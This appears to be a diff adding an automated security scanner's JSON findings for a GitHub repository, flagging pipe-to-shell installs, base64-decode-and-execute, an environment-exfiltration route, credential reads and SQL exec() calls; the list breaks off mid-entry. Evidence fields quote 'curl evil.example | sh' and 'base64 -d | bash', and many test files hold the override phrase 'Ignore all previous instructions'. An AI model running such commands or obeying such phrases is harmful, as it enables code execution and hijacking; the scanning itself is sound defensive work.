@@ -1,0 +1,711 @@
+{
+  "item": {
+    "source": "github:claude-skills",
+    "ecosystem": "GitHub",
+    "name": "martinambrus/haive",
+    "version": "ec2210f4be25608bf14ae3164ba195c1f89fe443",
+    "download": "https://codeload.github.com/martinambrus/haive/tar.gz/ec2210f4be25608bf14ae3164ba195c1f89fe443"
+  },
+  "archive_sha256": "60547cc0ed4469d8491df76627270bd693b09a6f404f540e89b17d51ebfe4ea6",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/README.md",
+      "line": 14,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/martinambrus/haive/main/install/ins",
+      "file_sha256": "e186bcbbd710a006cb467b4445e38f20532dcddcab48c487bc7b810f1d007789"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/install/install.sh",
+      "line": 5,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/martinambrus/haive/main/install/ins",
+      "file_sha256": "a604728e304318adbea5219bf0ce1db1993f568324337a6130ec3a46df8167b1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/scripts/test/install-channel.test.mjs",
+      "line": 415,
+      "evidence": "readFileSync(join(f.dir, '.docker/config.json'), 'utf8')",
+      "file_sha256": "b0fa8506ebea61e7a2187ba2fd2d08aafc5222bc498e1784682407ef8ad6a9bc"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/scripts/test/install-channel.test.mjs",
+      "line": 637,
+      "evidence": "readdirSync(join(f.dir, '.docker'))",
+      "file_sha256": "b0fa8506ebea61e7a2187ba2fd2d08aafc5222bc498e1784682407ef8ad6a9bc"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/scripts/test/install-channel.test.mjs",
+      "line": 638,
+      "evidence": "readFileSync(join(f.dir, '.docker/config.json'), 'utf8')",
+      "file_sha256": "b0fa8506ebea61e7a2187ba2fd2d08aafc5222bc498e1784682407ef8ad6a9bc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/docs/plans/patient-pinning-kernighan.md",
+      "line": 43,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "13409247c1fe240565d41510b569500cd8aee34fa90b21ec0f0299835c3d3da6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/docs/plans/frictionless-bootstrapping-otter.md",
+      "line": 86,
+      "evidence": "curl -fsSL <install-url> | sh",
+      "file_sha256": "7819b6ddc15a21083e7d0c739e91b672f03d884e4635b4db9ed1a836101bef64"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 110,
+      "evidence": "exec(` CREATE TABLE IF NOT EXISTS ${ENTRIES_TABLE} ( id uuid PRIMARY KEY DEFAULT",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 132,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_kb_entries_ns_status ON ${ENTRIES_T",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 135,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_kb_entries_embed_status ON ${ENTRIE",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 139,
+      "evidence": "exec(`ALTER TABLE ${ENTRIES_TABLE} ADD COLUMN IF NOT EXISTS topic_key TEXT`)",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 140,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_kb_entries_ns_topic_key ON ${ENTRIE",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 145,
+      "evidence": "exec(`ALTER TABLE ${ENTRIES_TABLE} ADD COLUMN IF NOT EXISTS supersedes_entry_id ",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 150,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_kb_entries_supersedes ON ${ENTRIES_",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 153,
+      "evidence": "exec(`ALTER TABLE ${ENTRIES_TABLE} ADD COLUMN IF NOT EXISTS description TEXT`)",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 167,
+      "evidence": "exec( `ALTER TABLE ${ENTRIES_TABLE} ADD COLUMN IF NOT EXISTS enforce jsonb, ADD ",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 170,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_kb_entries_ns_enforced ON ${ENTRIES",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 226,
+      "evidence": "exec(` CREATE TABLE IF NOT EXISTS ${VECTORS_TABLE} ( id SERIAL PRIMARY KEY, name",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 247,
+      "evidence": "exec( `ALTER TABLE ${VECTORS_TABLE} ADD COLUMN IF NOT EXISTS embed_kind TEXT CHE",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 250,
+      "evidence": "exec(`ALTER TABLE ${VECTORS_TABLE} ADD COLUMN IF NOT EXISTS embed_model TEXT`)",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 254,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_rag_vector_hnsw_model ON ${VECTORS_",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 264,
+      "evidence": "exec( `CREATE UNIQUE INDEX IF NOT EXISTS uq_global_rag_ns_entry_section_chunk ON",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 267,
+      "evidence": "exec(`CREATE INDEX IF NOT EXISTS idx_global_rag_namespace ON ${VECTORS_TABLE} (n",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 268,
+      "evidence": "exec(`CREATE INDEX IF NOT EXISTS idx_global_rag_entry_id ON ${VECTORS_TABLE} (en",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 269,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_rag_content_tsv ON ${VECTORS_TABLE}",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 275,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_global_rag_facets ON ${VECTORS_TABLE} USIN",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 279,
+      "evidence": "exec(`DROP INDEX IF EXISTS idx_global_rag_facets_${dim.toLowerCase()}`)",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 285,
+      "evidence": "exec(` CREATE OR REPLACE FUNCTION update_content_tsv() RETURNS trigger AS $$ BEG",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/shared/src/global-kb/ensure-schema.ts",
+      "line": 381,
+      "evidence": "exec(` UPDATE ${table} AS t SET facets = COALESCE(( SELECT jsonb_object_agg(kv.k",
+      "file_sha256": "b94113a39b66de7f71c0d78ca1f616401598ca43fbf2870afa7cd573e62360d5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/api/src/routes/repos.ts",
+      "line": 2627,
+      "evidence": "repoRoutes.post('/:id/remote', async (c) => { const userId = c.get('userId'); co",
+      "file_sha256": "ef19c0cec643fe2ec0b63281cda1aaaf9e280a7ccdda05e435e84e4e9fb042ff"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/install-codegen.test.ts",
+      "line": 19,
+      "evidence": "curl -fsSL https://antigravity.google/cli/install.sh | bash",
+      "file_sha256": "5f0c158be86dc03b5b732f59b4f0ce80291843db5adcc4657edfd9c2b41ad2c8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/step-runner-llm.test.ts",
+      "line": 715,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "07cbf4efc99968e4349e5b265ffacd4567d4e20d58e0584490067e8b168e701b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/env-dockerfile-pins.test.ts",
+      "line": 310,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "7432b9c30e7b33f6d62828787698de0d792f039ad2de24aff3e600eb70102ecb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/ddev-healthcheck-guard.test.ts",
+      "line": 258,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2865ee682fd17a2182da8a4c737177e266da91db47a9c1325508241c36768544"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/two-install-smoke.ts",
+      "line": 1862,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "b7f0a0facc79883cb1840b8b06f4264a324f015f245148df382ce6cfed51b252"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/fix-loop.test.ts",
+      "line": 775,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "fbee4b000765f03930249565eae25ec1394230a851aa4defaaf1da43e0f0d90a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/test/env-replicate-build.test.ts",
+      "line": 81,
+      "evidence": "readFile(opts.dockerfilePath!, 'utf8')",
+      "file_sha256": "36cd1b9fcedf99cd0818d8309398a20a4de35cf56696c89c4a0397a7eb22dcc1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/cli-versions/codegen.ts",
+      "line": 11,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_22.x | bash",
+      "file_sha256": "f602be7f0b71895101da7850a88ec203abcee5d31f53cfa60dea1f21a8f311bd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-nginx-include-guard.test.ts",
+      "line": 125,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "1ce2012fae1001dc52d8972066f624663d9c017a1db8b7956e368a768d66b417"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-build-guard.test.ts",
+      "line": 114,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "ebcabba5017981cb993087e5bc08f26721e2d9fd14b815e5920c6972740daef2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-playwright.test.ts",
+      "line": 96,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "15da86fc91a073e2319c68cfcbc2763cd0a5c64acdb642d636de1645a0664c85"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-config-yaml-guard.test.ts",
+      "line": 106,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "f046eb6c68d3c21b4c59f3421e20541fc98ce38b9549770bc347da7f8de7a821"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-runner.test.ts",
+      "line": 129,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "e735a42435f90a565a7e9b18bc75d130cda2fcdd7d3e73013d53f26e9d7b3ba5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-playwright.ts",
+      "line": 146,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "8ff6574cab47e0a460406b9f14e057b30495fc0d8f6afd0ba92e4b775540174c"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-runner.ts",
+      "line": 2411,
+      "evidence": "eval(Buffer.from(",
+      "file_sha256": "8b6c406da62e5f187662f406a9fb823608113fd9065ff0b954cf81ef631fcfce"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/sandbox/ddev-entrypoint-guard.test.ts",
+      "line": 449,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c4be54bec38693b29cb210d2ad0791b0bd9e7f255bfc3c2677282921c83d1b67"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/08c-code-review.test.ts",
+      "line": 511,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "b7874f3f8f4837ecc02f67aea619201e43194556b8d3a88185a8d8461dc62d63"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/07b-phase-4-validate.test.ts",
+      "line": 954,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "eb0c7ab6f6f0eb09f493c607247060d3bd637a99d6850ddb6a6512b74b251108"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/_similar-sites.test.ts",
+      "line": 29,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "b3cc087991004e4fe9999dc4345c8e1cd13a4a4fab4ae1d98a57252835a9c5bd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/07c-ddev-reconcile.test.ts",
+      "line": 545,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "9382ff5e532f0bfb04825fc574a80b993856fc788448c353b0d5a9948249ed18"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/11-phase-8-learning.test.ts",
+      "line": 979,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "de2fccfa2f1686790f9f8ec2bf3165a4aaf83913e2ace1bca626d4f4b66975f4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/_task-history-digest.test.ts",
+      "line": 254,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "f71a5f4e2a0f58d4b6a9b532df308bac29a648784171e6a9aa0b26c740e17487"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/_lint-scope.test.ts",
+      "line": 366,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "f7b71f5414869a581c20247a0f04060851743cb6858c4c3e1c0197220b10cfb9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/08b-test-management.test.ts",
+      "line": 591,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "765702430f169c60e186b2c7457f8bb46f629e60eb1f8b2a4895e81c7cb31b49"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/workflow/07-phase-2-implement.test.ts",
+      "line": 356,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "57386e44231f101857c502faa40d084203812ffcb0e8d45c7ce5c3a494635005"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 73,
+      "evidence": "exec(` CREATE TABLE IF NOT EXISTS ${RAG_TABLE} ( id SERIAL PRIMARY KEY, task_id ",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 93,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_rag_vector_hnsw ON ${RAG_TABLE} USING hnsw",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 127,
+      "evidence": "exec(`CREATE INDEX IF NOT EXISTS idx_rag_task_id ON ${RAG_TABLE} (task_id)`)",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 128,
+      "evidence": "exec(`CREATE INDEX IF NOT EXISTS idx_rag_repository_id ON ${RAG_TABLE} (reposito",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 129,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_rag_source_section ON ${RAG_TABLE} (source",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 132,
+      "evidence": "exec(`CREATE INDEX IF NOT EXISTS idx_rag_source_type ON ${RAG_TABLE} (source_typ",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 133,
+      "evidence": "exec( `CREATE INDEX IF NOT EXISTS idx_rag_content_tsv ON ${RAG_TABLE} USING GIN ",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/onboarding/_rag-connection.ts",
+      "line": 150,
+      "evidence": "exec(` CREATE OR REPLACE FUNCTION update_content_tsv() RETURNS trigger AS $$ BEG",
+      "file_sha256": "8ec45edd05416fd93f67bdaaa3839de71f4d5e6fbe08ab28aaee65ad7ec82fba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "haive-ec2210f4be25608bf14ae3164ba195c1f89fe443/packages/worker/src/step-engine/steps/env-replicate/02-generate-dockerfile.ts",
+      "line": 446,
